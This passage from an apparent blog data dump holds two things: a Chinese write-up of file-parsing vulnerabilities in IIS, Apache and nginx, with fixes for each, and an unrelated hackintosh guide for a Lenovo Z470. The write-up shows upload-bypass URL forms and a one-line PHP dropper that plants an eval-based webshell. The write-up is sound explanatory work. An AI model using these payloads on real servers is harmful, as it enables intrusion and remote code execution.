漏洞形式\nwww.xxxx.xxx.com/test.php.php123\n##### 其余配置问题导致漏洞\n（1）如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。\n（2）如果在 Apache 的 conf 里有这样一行配置 AddType application/x-httpd-php .jpg 即使扩展名是 jpg，一样能以 php 方式执行。\n##### 修复方案\n1.apache配置文件，禁止.php.这样的文件执行，配置文件里面加入\n```bash\n<Files ~ “.(php.|php3.)”>\n        Order Allow,Deny\n        Deny from all\n</Files>\n```\n2.用伪静态能解决这个问题，重写类似.php.*这类文件，打开apache的httpd.conf找到LoadModule rewrite_module modules/mod_rewrite.so\n把#号去掉，重启apache,在网站根目录下建立.htaccess文件,代码如下:\n```bash\n<IfModule mod_rewrite.c>\nRewriteEngine On\nRewriteRule .(php.|php3.) /index.php\nRewriteRule .(pHp.|pHp3.) /index.php\nRewriteRule .(phP.|phP3.) /index.php\nRewriteRule .(Php.|Php3.) /index.php\nRewriteRule .(PHp.|PHp3.) /index.php\nRewriteRule .(PhP.|PhP3.) /index.php\nRewriteRule .(pHP.|pHP3.) /index.php\nRewriteRule .(PHP.|PHP3.) /index.php\n</IfModule>\n```\n\n#### （三）nginx解析漏洞\n##### 漏洞原理\n　　Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。 如果开启了这个选项，那么就会触发在PHP中的如下逻辑：\n\nPHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了\n##### 漏洞形式\nwww.xxxx.com/UploadFiles/image/1.jpg/1.php\nwww.xxxx.com/UploadFiles/image/1.jpg%00.php\nwww.xxxx.com/UploadFiles/image/1.jpg/%20\\0.php\n\n另外一种手法：上传一个名字为test.jpg，以下内容的文件。\n```bash\n<?PHP fputs(fopen('shell.php','w'),'<?php eval($_POST[cmd])?>');?>\n```\n然后访问test.jpg/.php,在这个目录下就会生成一句话木马shell.php。\n##### 修复方案\n1.修改php.ini文件，将cgi.fix_pathinfo的值设置为0;\n2.在Nginx配置文件中添加以下代码：\n```bash\n　　if ( $fastcgi_script_name ~ ..*/.*php ) {\n　　return 403;\n　　}\n```\n　　这行代码的意思是当匹配到类似test.jpg/a.php的URL时，将返回403错误代码。\n\n#### （四）IIS7.5解析漏洞\n\nIIS7.5的漏洞与nginx的类似，都是由于php配置文件中，开启了cgi.fix_pathinfo，而这并不是nginx或者iis7.5本身的漏洞。","slug":"服务器解析漏洞","published":1,"updated":"2017-02-14T01:12:03.339Z","layout":"post","photos":[],"link":"","_id":"ciz80dybv001j3ofvbw76an8v","content":"<p>　　服务器解析漏洞算是历史比较悠久了，但如今依然广泛存在。在此记录汇总一些常见服务器的解析漏洞，比如IIS6.0、IIS7.5、apache、nginx等方便以后回顾温习。<br><a id=\"more\"></a></p>\n<h4 id=\"（一）IIS5-x-6-x解析漏洞\"><a href=\"#（一）IIS5-x-6-x解析漏洞\" class=\"headerlink\" title=\"（一）IIS5.x-6.x解析漏洞\"></a>（一）IIS5.x-6.x解析漏洞</h4><p>使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语句一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件。</p>\n<h5 id=\"目录解析-6-0\"><a href=\"#目录解析-6-0\" class=\"headerlink\" title=\"目录解析(6.0)\"></a>目录解析(6.0)</h5><p>形式：www.xxx.com/xx.asp/xx.jpg<br>原理: 服务器默认会把.asp，.asa目录下的文件都解析成asp文件。</p>\n<h5 id=\"文件解析\"><a href=\"#文件解析\" class=\"headerlink\" title=\"文件解析\"></a>文件解析</h5><p>形式：www.xxx.com/xx.asp;.jpg<br>原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。</p>\n<h5 id=\"解析文件类型\"><a href=\"#解析文件类型\" class=\"headerlink\" title=\"解析文件类型\"></a>解析文件类型</h5><p>IIS6.0 默认的可执行文件除了asp还包含这三种 :<br>/test.asa<br>/test.cer<br>/test.cdx</p>\n<h5 id=\"修复方案\"><a href=\"#修复方案\" class=\"headerlink\" title=\"修复方案\"></a>修复方案</h5><p>1.目前尚无微软官方的补丁，可以通过自己编写正则，阻止上传xx.asp;.jpg类型的文件名。<br>2.做好权限设置，限制用户创建文件夹。</p>\n<h4 id=\"（二）apache解析漏洞\"><a href=\"#（二）apache解析漏洞\" class=\"headerlink\" title=\"（二）apache解析漏洞\"></a>（二）apache解析漏洞</h4><h5 id=\"漏洞原理\"><a href=\"#漏洞原理\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h5><p>　　Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php。</p>\n<h5 id=\"漏洞形式\"><a href=\"#漏洞形式\" class=\"headerlink\" title=\"漏洞形式\"></a>漏洞形式</h5><p>www.xxxx.xxx.com/test.php.php123</p>\n<h5 id=\"其余配置问题导致漏洞\"><a href=\"#其余配置问题导致漏洞\" class=\"headerlink\" title=\"其余配置问题导致漏洞\"></a>其余配置问题导致漏洞</h5><p>（1）如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。<br>（2）如果在 Apache 的 conf 里有这样一行配置 AddType application/x-httpd-php .jpg 即使扩展名是 jpg，一样能以 php 方式执行。</p>\n<h5 id=\"修复方案-1\"><a href=\"#修复方案-1\" class=\"headerlink\" title=\"修复方案\"></a>修复方案</h5><p>1.apache配置文件，禁止.php.这样的文件执行，配置文件里面加入<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;Files ~ “.(php.|php3.)”&gt;</div><div class=\"line\">        Order Allow,Deny</div><div class=\"line\">        Deny from all</div><div class=\"line\">&lt;/Files&gt;</div></pre></td></tr></table></figure></p>\n<p>2.用伪静态能解决这个问题，重写类似.php.*这类文件，打开apache的httpd.conf找到LoadModule rewrite_module modules/mod_rewrite.so<br>把#号去掉，重启apache,在网站根目录下建立.htaccess文件,代码如下:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;IfModule mod_rewrite.c&gt;</div><div class=\"line\">RewriteEngine On</div><div class=\"line\">RewriteRule .(php.|php3.) /index.php</div><div class=\"line\">RewriteRule .(pHp.|pHp3.) /index.php</div><div class=\"line\">RewriteRule .(phP.|phP3.) /index.php</div><div class=\"line\">RewriteRule .(Php.|Php3.) /index.php</div><div class=\"line\">RewriteRule .(PHp.|PHp3.) /index.php</div><div class=\"line\">RewriteRule .(PhP.|PhP3.) /index.php</div><div class=\"line\">RewriteRule .(pHP.|pHP3.) /index.php</div><div class=\"line\">RewriteRule .(PHP.|PHP3.) /index.php</div><div class=\"line\">&lt;/IfModule&gt;</div></pre></td></tr></table></figure></p>\n<h4 id=\"（三）nginx解析漏洞\"><a href=\"#（三）nginx解析漏洞\" class=\"headerlink\" title=\"（三）nginx解析漏洞\"></a>（三）nginx解析漏洞</h4><h5 id=\"漏洞原理-1\"><a href=\"#漏洞原理-1\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h5><p>　　Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。 如果开启了这个选项，那么就会触发在PHP中的如下逻辑：</p>\n<p>PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了</p>\n<h5 id=\"漏洞形式-1\"><a href=\"#漏洞形式-1\" class=\"headerlink\" title=\"漏洞形式\"></a>漏洞形式</h5><p>www.xxxx.com/UploadFiles/image/1.jpg/1.php<br>www.xxxx.com/UploadFiles/image/1.jpg%00.php<br>www.xxxx.com/UploadFiles/image/1.jpg/%20\\0.php</p>\n<p>另外一种手法：上传一个名字为test.jpg，以下内容的文件。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?PHP fputs(fopen(<span class=\"string\">'shell.php'</span>,<span class=\"string\">'w'</span>),<span class=\"string\">'&lt;?php eval($_POST[cmd])?&gt;'</span>);?&gt;</div></pre></td></tr></table></figure></p>\n<p>然后访问test.jpg/.php,在这个目录下就会生成一句话木马shell.php。</p>\n<h5 id=\"修复方案-2\"><a href=\"#修复方案-2\" class=\"headerlink\" title=\"修复方案\"></a>修复方案</h5><p>1.修改php.ini文件，将cgi.fix_pathinfo的值设置为0;<br>2.在Nginx配置文件中添加以下代码：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">　　<span class=\"keyword\">if</span> ( <span class=\"variable\">$fastcgi_script_name</span> ~ ..*/.*php ) &#123;</div><div class=\"line\">　　<span class=\"built_in\">return</span> 403;</div><div class=\"line\">　　&#125;</div></pre></td></tr></table></figure></p>\n<p>　　这行代码的意思是当匹配到类似test.jpg/a.php的URL时，将返回403错误代码。</p>\n<h4 id=\"（四）IIS7-5解析漏洞\"><a href=\"#（四）IIS7-5解析漏洞\" class=\"headerlink\" title=\"（四）IIS7.5解析漏洞\"></a>（四）IIS7.5解析漏洞</h4><p>IIS7.5的漏洞与nginx的类似，都是由于php配置文件中，开启了cgi.fix_pathinfo，而这并不是nginx或者iis7.5本身的漏洞。</p>\n","excerpt":"<p>　　服务器解析漏洞算是历史比较悠久了，但如今依然广泛存在。在此记录汇总一些常见服务器的解析漏洞，比如IIS6.0、IIS7.5、apache、nginx等方便以后回顾温习。<br>","more":"</p>\n<h4 id=\"（一）IIS5-x-6-x解析漏洞\"><a href=\"#（一）IIS5-x-6-x解析漏洞\" class=\"headerlink\" title=\"（一）IIS5.x-6.x解析漏洞\"></a>（一）IIS5.x-6.x解析漏洞</h4><p>使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语句一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件。</p>\n<h5 id=\"目录解析-6-0\"><a href=\"#目录解析-6-0\" class=\"headerlink\" title=\"目录解析(6.0)\"></a>目录解析(6.0)</h5><p>形式：www.xxx.com/xx.asp/xx.jpg<br>原理: 服务器默认会把.asp，.asa目录下的文件都解析成asp文件。</p>\n<h5 id=\"文件解析\"><a href=\"#文件解析\" class=\"headerlink\" title=\"文件解析\"></a>文件解析</h5><p>形式：www.xxx.com/xx.asp;.jpg<br>原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。</p>\n<h5 id=\"解析文件类型\"><a href=\"#解析文件类型\" class=\"headerlink\" title=\"解析文件类型\"></a>解析文件类型</h5><p>IIS6.0 默认的可执行文件除了asp还包含这三种 :<br>/test.asa<br>/test.cer<br>/test.cdx</p>\n<h5 id=\"修复方案\"><a href=\"#修复方案\" class=\"headerlink\" title=\"修复方案\"></a>修复方案</h5><p>1.目前尚无微软官方的补丁，可以通过自己编写正则，阻止上传xx.asp;.jpg类型的文件名。<br>2.做好权限设置，限制用户创建文件夹。</p>\n<h4 id=\"（二）apache解析漏洞\"><a href=\"#（二）apache解析漏洞\" class=\"headerlink\" title=\"（二）apache解析漏洞\"></a>（二）apache解析漏洞</h4><h5 id=\"漏洞原理\"><a href=\"#漏洞原理\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h5><p>　　Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php。</p>\n<h5 id=\"漏洞形式\"><a href=\"#漏洞形式\" class=\"headerlink\" title=\"漏洞形式\"></a>漏洞形式</h5><p>www.xxxx.xxx.com/test.php.php123</p>\n<h5 id=\"其余配置问题导致漏洞\"><a href=\"#其余配置问题导致漏洞\" class=\"headerlink\" title=\"其余配置问题导致漏洞\"></a>其余配置问题导致漏洞</h5><p>（1）如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。<br>（2）如果在 Apache 的 conf 里有这样一行配置 AddType application/x-httpd-php .jpg 即使扩展名是 jpg，一样能以 php 方式执行。</p>\n<h5 id=\"修复方案-1\"><a href=\"#修复方案-1\" class=\"headerlink\" title=\"修复方案\"></a>修复方案</h5><p>1.apache配置文件，禁止.php.这样的文件执行，配置文件里面加入<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;Files ~ “.(php.|php3.)”&gt;</div><div class=\"line\">        Order Allow,Deny</div><div class=\"line\">        Deny from all</div><div class=\"line\">&lt;/Files&gt;</div></pre></td></tr></table></figure></p>\n<p>2.用伪静态能解决这个问题，重写类似.php.*这类文件，打开apache的httpd.conf找到LoadModule rewrite_module modules/mod_rewrite.so<br>把#号去掉，重启apache,在网站根目录下建立.htaccess文件,代码如下:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;IfModule mod_rewrite.c&gt;</div><div class=\"line\">RewriteEngine On</div><div class=\"line\">RewriteRule .(php.|php3.) /index.php</div><div class=\"line\">RewriteRule .(pHp.|pHp3.) /index.php</div><div class=\"line\">RewriteRule .(phP.|phP3.) /index.php</div><div class=\"line\">RewriteRule .(Php.|Php3.) /index.php</div><div class=\"line\">RewriteRule .(PHp.|PHp3.) /index.php</div><div class=\"line\">RewriteRule .(PhP.|PhP3.) /index.php</div><div class=\"line\">RewriteRule .(pHP.|pHP3.) /index.php</div><div class=\"line\">RewriteRule .(PHP.|PHP3.) /index.php</div><div class=\"line\">&lt;/IfModule&gt;</div></pre></td></tr></table></figure></p>\n<h4 id=\"（三）nginx解析漏洞\"><a href=\"#（三）nginx解析漏洞\" class=\"headerlink\" title=\"（三）nginx解析漏洞\"></a>（三）nginx解析漏洞</h4><h5 id=\"漏洞原理-1\"><a href=\"#漏洞原理-1\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h5><p>　　Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。 如果开启了这个选项，那么就会触发在PHP中的如下逻辑：</p>\n<p>PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了</p>\n<h5 id=\"漏洞形式-1\"><a href=\"#漏洞形式-1\" class=\"headerlink\" title=\"漏洞形式\"></a>漏洞形式</h5><p>www.xxxx.com/UploadFiles/image/1.jpg/1.php<br>www.xxxx.com/UploadFiles/image/1.jpg%00.php<br>www.xxxx.com/UploadFiles/image/1.jpg/%20\\0.php</p>\n<p>另外一种手法：上传一个名字为test.jpg，以下内容的文件。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?PHP fputs(fopen(<span class=\"string\">'shell.php'</span>,<span class=\"string\">'w'</span>),<span class=\"string\">'&lt;?php eval($_POST[cmd])?&gt;'</span>);?&gt;</div></pre></td></tr></table></figure></p>\n<p>然后访问test.jpg/.php,在这个目录下就会生成一句话木马shell.php。</p>\n<h5 id=\"修复方案-2\"><a href=\"#修复方案-2\" class=\"headerlink\" title=\"修复方案\"></a>修复方案</h5><p>1.修改php.ini文件，将cgi.fix_pathinfo的值设置为0;<br>2.在Nginx配置文件中添加以下代码：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">　　<span class=\"keyword\">if</span> ( <span class=\"variable\">$fastcgi_script_name</span> ~ ..*/.*php ) &#123;</div><div class=\"line\">　　<span class=\"built_in\">return</span> 403;</div><div class=\"line\">　　&#125;</div></pre></td></tr></table></figure></p>\n<p>　　这行代码的意思是当匹配到类似test.jpg/a.php的URL时，将返回403错误代码。</p>\n<h4 id=\"（四）IIS7-5解析漏洞\"><a href=\"#（四）IIS7-5解析漏洞\" class=\"headerlink\" title=\"（四）IIS7.5解析漏洞\"></a>（四）IIS7.5解析漏洞</h4><p>IIS7.5的漏洞与nginx的类似，都是由于php配置文件中，开启了cgi.fix_pathinfo，而这并不是nginx或者iis7.5本身的漏洞。</p>"},{"title":"联想Z470黑化之路","date":"2017-02-13T01:32:50.000Z","_content":"　　11年入手了一台联想Z470，到现在也有些年头了，当年是看中了它的外观，现在想来性能是它的短板。然而为了工作需要，我便又购置了一台高性能电脑。现如今便想着怎么处理这台小Z，有人建议当废品出售，但无论如何它都跟了我这么多年，舍弃有些不忍。抱着勤俭持家的态度，我便狠了狠心决定多花点钱，将它全面更新升级。在上网找了些资料后，便开始整理思路，汇总如下：\n* 更新内容：将原有部分硬件换新（声卡、网卡、外壳、键盘等）\n* 升级内容：内存加到8G，添加固态硬盘\n* 系统更换：黑化之苹果系统\n\n　　这其中最繁琐的要数装黑苹果系统，技术含量比较高，前2个比较好实现（只要花钱）。有了目标，便开始淘宝购买物件吧，前后大概花了800多，终于凑齐了所有所需之物，好了，那么便开始吧！\n\n### 更换升级零件\n　　对于物件更换，这里不多介绍，只要会拆机就行，拆机之前多上网查查机型，根据教程来，不要盲目拆机。\n　　加内存条也比较简单，也是先查询机型兼容的内存条型号，购买相应的装入即可。\n　　至于安装SSD（固态硬盘），我的做法是将光驱拆下，将原有的机械硬盘放到光驱（需要购买托盘），再将SSD装入原先机械硬盘处即可。\n　　以上一切做完之后，小Z已经从硬件上进行了全面大升级（显卡跟CPU不建议更改，可能会使主板损坏，其提升效果不明显）。接下来就是本文重点，更换苹果系统。\n\n### 安装黑苹果\n\n#### 准备阶段\n* 第一：上网查资料，上网查资料，上网查资料。。。。。重要的事情多说几遍，要学会自己查找答案。\n* 第二：查找对应机型的电脑是否有安装黑苹果成功的案例，如果没有，那么我觉得是时候放弃了（除非是专门研究黑苹果的技术男，不然不要轻易去试）。我算运气比较好的，上网查了一圈，发现有不少小Z安装黑苹果成功的案例。\n* 第三：根据网上成功的教程，下载好所需的软件，复制网上成功的路线。\n\t所需软件：\n\t* 变色龙引导程序\n\t* 懒人版镜像\n\t* 硬盘助手\n\t* HFS\n\t* DiskGenius Pro 4.30\n\t* ......\n\n准备工作都弄好了，那么可以开始动手干了！\n\n##### 安装变色龙引导程序\n![](/upload_image/20170213/1.png)\n以管理员身份打开：\n![](/upload_image/20170213/2.png)\n　　如果点击安装，没有反应，则需要打开电脑磁盘管理（右击计算机，管理），给那个100M的隐藏磁盘分配盘符（注意不能分配A盘符，其余的盘符都可以分配），分配完后，重新打开变色龙安装程序，重新安装。安装完成后，会在C盘或者100M的系统隐藏盘生成3个隐藏文件。\n![](/upload_image/20170213/3.png)\n这3个文件是变色龙的引导文件。\n\n##### 安装HFS\n![](/upload_image/20170213/4.png)\n直接双击运行，一路安装，具体作用自行百度吧。\n\n##### 给电脑分区\n首先分配一个8G大小的区，注意不要格式化。（用来放OSX安装程序，相当于硬盘安装盘）\n然后再分配个大小不上限的区，注意不要格式化。（用来安装OSX，相当于windows的C盘）\n##### 打开硬盘助手\n![](/upload_image/20170213/5.png)\n将下载好的系统盘（我用的是懒人版，7.5G大小），写入刚分配好的8G大小的磁盘中，需要等到几分钟。。。\n\n##### DiskGenius Pro 4.30（查看磁盘状态工具）\n![](/upload_image/20170213/6.png)\n将刚才分的2个磁盘（8G，不上限大小），标识都设置为AF。右击更改参数，直接改为AF。\n\n##### 将EFI文件放入安装盘根目录\n![](/upload_image/20170213/7.png)\n即放在那个8G大小的盘根目录。\n注意：如果打开资源管理器，看不到8G的那个磁盘，可以重启电脑再看看。实在没有，估计是磁盘分区有问题，可能就需要重装系统了。\n\n##### EDID注入\nEFI下面有一个config.split文件，需要替换成自己电脑的edid（替换方法自行百度），这个文件是clover引导的配置文件，至关重要。\n\n##### 将Clover.iso替换wowpc.iso\n将clover.iso重命名为wowpc.iso，然后替换C盘或者隐藏盘下的wowpc.iso。这样变色龙引导会直接跳转到clover引导。\n\n#### 安装阶段\n　　安装的过程中，最主要的是看会不会卡logo，或者黑屏。如果出现这2种情况，绝大部分原因是config.split配置文件的问题。如果一切正常，那么会成功进入安装界面，在选择安装到哪个盘时，要先选择菜单栏上的磁盘工具找到那个分配的准备拿来存放OSX系统的磁盘，选择抹掉，格式为OS（日志格式），再回到安装界面，就会发现可以选择那个磁盘进行安装了。\n\n#### 驱动配置\n　　等到安装完成，就差不多可以用了，但是无线网卡驱动跟声音驱动还没有弄好。\n　　安装无线网卡驱动：改无线网卡2a为2b，方法为finder进10.11系统盘system/library/extensions/,找到IO82011Family.kext，右键显示包内容找到/contents/Pluglus/AirportAtheros40.kext，继续右键显示包内容，找到contents/Info.pilst，用plistEdit Pro（自行百度安装该软件）打开，找到：\n```bash\n                        <array>\n                                <string>pci168c,30</string>\n                                <string>pci168c,2a</string>\n                                <string>pci106b,0086</string>\n                                <string>pci168c,1c</string>\n                                <string>pci168c,23</string>\n                                <string>pci168c,24</string>\n                        </array>\n```\n代码，将第三行里面的2a改为2b，保存退出，之后用KCPM Utility Pro.app修复重建缓存\n，重启。重启之后无线网卡应该能成功驱动了。\n　　安装声卡驱动：即AppleHDA.kext驱动，删除system/library/extensions/AppleHDA.kext后，用KCPM Utility Pro进行安装，路径也为system/library/extensions/，安装完成之后重建缓存即可。\n\n#### 截图见证\n![](/upload_image/20170213/8.png)\n![](/upload_image/20170213/9.png)\n\n*提醒：以上过程只适用于联想Z470，其他机型请上网查资料......*\n\n\n参考：[远景论坛](http://bbs.pcbeta.com/viewthread-1662315-1-1.html)","source":"_posts/联想Z470黑苹果教程.md","raw":"---\ntitle: 联想Z470黑化之路\ndate: 2017-02-13 09:32:50\ntags: 黑苹果\ncategories: 技术交流\n---\n　　11年入手了一台联想Z470，到现在也有些年头了，当年是看中了它的外观，现在想来性能是它的短板。然而为了工作需要，我便又购置了一台高性能电脑。现如今便想着怎么处理这台小Z，有人建议当废品出售，但无论如何它都跟了我这么多年，舍弃有些不忍。抱着勤俭持家的态度，我便狠了狠心决定多花点钱，将它全面更新升级。在上网找了些资料后，便开始整理思路，汇总如下：\n* 更新内容：将原有部分硬件换新（声卡、网卡、外壳、键盘等）\n* 升级内容：内存加到8G，添加固态硬盘\n* 系统更换：黑化之苹果系统\n\n　　这其中最繁琐的要数装黑苹果系统，技术含量比较高，前2个比较好实现（只要花钱）。有了目标，便开始淘宝购买物件吧，前后大概花了800多，终于凑齐了所有所需之物，好了，那么便开始吧！\n\n### 更换升级零件\n　　对于物件更换，这里不多介绍，只要会拆机就行，拆机之前多上网查查机型，根据教程来，不要盲目拆机。\n　　加内存条也比较简单，也是先查询机型兼容的内存条型号，购买相应的装入即可。\n　　至于安装SSD（固态硬盘），我的做法是将光驱拆下，将原有的机械硬盘放到光驱（需要购买托盘），再将SSD装入原先机械硬盘处即可。\n　　以上一切做完之后，小Z已经从硬件上进行了全面大升级（显卡跟CPU不建议更改，可能会使主板损坏，其提升效果不明显）。接下来就是本文重点，更换苹果系统。\n\n### 安装黑苹果\n\n#### 准备阶段\n* 第一：上网查资料，上网查资料，上网查资料。。。。。重要的事情多说几遍，要学会自己查找答案。\n* 第二：查找对应机型的电脑是否有安装黑苹果成功的案例，如果没有，那么我觉得是时候放弃了（除非是专门研究黑苹果的技术男，不然不要轻易去试）。我算运气比较好的，上网查了一圈，发现有不少小Z安装黑苹果成功的案例。\n* 第三：根据网上成功的教程，下载好所需的软件，复制网上成功的路线。\n\t所需软件：\n\t* 变色龙引导程序\n\t* 懒人版镜像\n\t* 硬盘助手\n\t* HFS\n\t* DiskGenius Pro 4.30\n\t* ......\n\n准备工作都弄好了，那么可以开始动手干了！\n\n##### 安装变色龙引导程序\n![](/upload_image/20170213/1.png)\n以管理员身份打开：\n![](/upload_image/20170213/2.png)\n　　如果点击安装，没有反应，则需要打开电脑磁盘管理（右击计算机，管理），给那个100M的隐藏磁盘分配盘符（注意不能分配A盘符，其余的盘符都可以分配），分配完后，重新打开变色龙安装程序，重新安装。安装完成后，会在C盘或者100M的系统隐藏盘生成3个隐藏文件。\n![](/upload_image/20170213/3.png)\n这3个文件是变色龙的引导文件。\n\n##### 安装HFS\n![](/upload_image/20170213/4.png)\n直接双击运行，一路安装，具体作用自行百度吧。\n\n##### 给电脑分区\n首先分配一个8G大小的区，注意不要格式化。（用来放OSX安装程序，相当于硬盘安装盘）\n然后再分配个大小不上限的区，注意不要格式化。（用来安装OSX，相当于windows的C盘）\n##### 打开硬盘助手\n![](/upload_image/20170213/5.png)\n将下载好的系统盘（我用的是懒人版，7.5G大小），写入刚分配好的8G大小的磁盘中，需要等到几分钟。。。\n\n##### DiskGenius Pro 4.30（查看磁盘状态工具）\n![](/upload_image/20170213/6.png)\n将刚才分的2个磁盘（8G，不上限大小），标识都设置为AF。右击更改参数，直接改为AF。\n\n##### 将EFI文件放入安装盘根目录\n![](/upload_image/20170213/7.png)\n即放在那个8G大小的盘根目录。\n注意：如果打开资源管理器，看不到8G的那个磁盘，可以重启电脑再看看。实在没有，估计是磁盘分区有问题，可能就需要重装系统了。\n\n##### EDID注入\nEFI下面有一个config.split文件，需要替换成自己电脑的edid（替换方法自行百度），这个文件是clover引导的配置文件，至关重要。\n\n##### 将Clover.iso替换wowpc.iso\n将clover.iso重命名为wowpc.iso，然后替换C盘或者隐藏盘下的wowpc.iso。这样变色龙引导会直接跳转到clover引导。\n\n#### 安装阶段\n　　安装的过程中，最主要的是看会不会卡logo，或者黑屏。如果出现这2种情况，绝大部分原因是config.split配置文件的问题。如果一切正常，那么会成功进入安装界面，在选择安装到哪个盘时，要先选择菜单栏上的磁盘工具找到那个分配的准备拿来存放OSX系统的磁盘，选择抹掉，格式为OS（日志格式），再回到安装界面，就会发现可以选择那个磁盘进行安装了。\n\n#### 驱动配置\n　　等到安装完成，就差不多可以用了，但是无线网卡驱动跟声音驱动还没有弄好。\n　　安装无线网卡驱动：改无线网卡2a为2b，方法为finder进10.11系统盘system/library/extensions/,找到IO82011Family.kext，右键显示包内容找到/contents/Pluglus/AirportAtheros40.kext，继续右键显示包内容，找到contents/Info.pilst，用plistEdit Pro（自行百度安装该软件）打开，找到：\n```bash\n                        <array>\n                                <string>pci168c,30</string>\n                                <string>pci168c,2a</string>\n                                <string>pci106b,0086</string>\n                                <string>pci168c,1c</string>\n                                <string>pci168c,23</string>\n                                <string>pci168c,24</string>\n                        </array>\n```\n代码，将第三行里面的2a改为2b，保存退出，之后用KCPM Utility Pro.app修复重建缓存\n，重启。重启之后无线网卡应该能成功驱动了。\n　　安装声卡驱动：即AppleHDA.kext驱动，删除system/library/extensions/AppleHDA.kext后，用KCPM Utility Pro进行安装，路径也为system/library/extensions/，安装完成之后重建缓存即可。\n\n#### 截图见证\n![](/upload_image/20170213/8.png)\n![](/upload_image/20170213/9.png)\n\n*提醒：以上过程只适用于联想Z470，其他机型请上网查资料......*\n\n\n参考：[远景论坛](http://bbs.pcbeta.com/viewthread-1662315-1-1.html)","slug":"联想Z470黑苹果教程","published":1,"updated":"2017-02-14T01:12:03.339Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciz80dyc1001n3ofv540nzrs7","content":"<p>　　